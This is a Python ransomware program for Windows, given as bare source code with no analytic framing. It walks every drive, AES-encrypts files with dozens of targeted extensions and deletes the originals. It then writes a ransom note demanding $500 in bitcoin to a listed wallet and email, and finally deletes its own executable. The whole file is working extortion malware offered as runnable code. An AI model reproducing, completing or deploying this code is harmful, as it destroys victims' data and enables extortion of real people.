import win32api
from Crypto.Hash import SHA256
from Crypto.Cipher import AES
import os, random, sys
suffix = '.fucku'
valid_extension = [
 '.txt', '.exe', '.php', '.pl', 
 '.7z', '.rar', '.m4a', '.wma', 
 '.avi', '.ino',
 '.wmv', '.csv', '.d3dbsp', 
 '.sc2save', '.sie', '.sum', '.ibank', 
 '.t13', 
 '.t12', '.qdf', '.gdb', 
 '.tax', '.pkpass', '.bc6', '.bc7', 
 '.bkp', 
 '.qic', '.bkf', '.sidn', 
 '.sidd', '.mddata', '.itl', '.itdb', 
 '.icxs', 
 '.hvpl', '.hplg', '.hkdb', 
 '.mdbackup', '.syncdb', '.gho', '.cas', 
 '.svg', 
 '.map', '.wmo', '.itm', 
 '.sb', '.fos', '.mcgame', '.vdf', 
 '.ztmp', 
 '.sis', '.sid', '.ncf', 
 '.menu', '.layout', '.dmp', '.blob', 
 '.esm', 
 '.001', '.vtf', '.dazip', 
 '.fpk', '.mlx', '.kf', '.iwd', 
 '.vpk', 
 '.tor', '.psk', '.rim', 
 '.w3x', '.fsh', '.ntl', '.arch00', 
 '.lvl', 
 '.snx', '.cfr', '.ff', 
 '.vpp_pc', '.lrf', '.m2', '.mcmeta', 
 '.vfs0', 
 '.mpqge', '.kdb', '.db0', 
 '.mp3', '.upx', '.rofl', '.hkx', 
 '.bar', 
 '.upk', '.das', '.iwi', 
 '.litemod', '.asset', '.forge', '.ltx', 
 '.bsa', 
 '.apk', '.re4', '.sav', 
 '.lbf', '.slm', '.bik', '.epk', 
 '.rgss3a', 
 '.pak', '.big', '.unity3d', 
 '.wotreplay', '.xxx', '.desc', '.py', 
 '.m3u', 
 '.flv', '.js', '.css', 
 '.rb', '.png', '.jpeg', '.p7c', 
 '.p7b', '.p12', 
 '.pfx', '.pem', 
 '.crt', '.cer', '.der', '.x3f', 
 '.srw', '.pef', 
 '.ptx', '.r3d', 
 '.rw2', '.rwl', '.raw', '.raf', 
 '.orf', '.nrw']

def encrypt(key, file_name):
    chunk_s = 65536
    output_file = os.path.join(os.path.dirname(file_name), os.path.basename(file_name) + suffix)
    fsize = str(os.path.getsize(file_name)).zfill(16)
    ini_vect = ''
    for i in range(16):
        ini_vect += chr(random.randint(0, 255))

    encryptor = AES.new(key, AES.MODE_CBC, ini_vect)
    with open(file_name, 'rb') as (infile):
        with open(output_file, 'wb') as (outfile):
            outfile.write(fsize)
            outfile.write(ini_vect)
            while True:
                chunk = infile.read(chunk_s)
                if len(chunk) == 0:
                    break
                elif len(chunk) % 16 != 0:
                    chunk += ' ' * (16 - len(chunk) % 16)
                outfile.write(encryptor.encrypt(chunk))


def getDigest(password):
    hasher = SHA256.new(password)
    return hasher.digest()


readmename = 'RECOVER_FILES.txt'

def files2crypt(path):
    allFiles = []
    for root, subfiles, files in os.walk(path):
        for names in files:
            allFiles.append(os.path.join(root, names))

    return allFiles


def run_crypt():
    drives = win32api.GetLogicalDriveStrings()
    drives = drives.split('\x00')[:-1]
    password = 'j<L;G|hD*3CQk%I!g|Ei&#aQ6*;Vh,'
    addresses = ['1Jbeu7yQJRbtnMbomQJpTGWphiwHzWgv7F']
    readme_str = 'ALL YOUR FILES WERE incript. \n ORDER, TO RESTORE THIS FILE, YOU MUST SEND AT THIS ADDRESS\n'
    readme_str += 'FOR $500 BTC FOR COMPUTER\n'
    readme_str += random.choice(addresses)
    readme_str += 'AFTER PAYMENT SENT EMAIL nullforwarding@qualityservice.com\nFOR INSTALLATION FOR DECRIPT\n'
    readme_str += 'NOT TO TURN OFF YOUR COMPUTER, UNLESS IT WILL BREAK'
    if len(sys.argv) > 1:
        encrypt(getDigest(password), str(sys.argv[1]))
        os.remove(str(sys.argv[1]))
        sys.exit(0)
    for drive in drives:
        for file_pnt in files2crypt(drive):
            if os.path.basename(file_pnt).endswith(suffix) or 'System32' in file_pnt:
                pass
            else:
                extension = os.path.splitext(file_pnt)[1]
                if extension in valid_extension:
                    try:
                        encrypt(getDigest(password), str(file_pnt))
                        os.remove(file_pnt)
                    except:
                        pass

        for root, subfiles, files in os.walk(drive):
            if 'System32' in root:
                pass
            try:
                readme = open(os.path.join(root, readmename), 'w')
                readme.write(readme_str)
                readme.close()
            except:
                pass

    if 'python' not in sys.executable.lower():
        os.remove(sys.executable)


run_crypt()
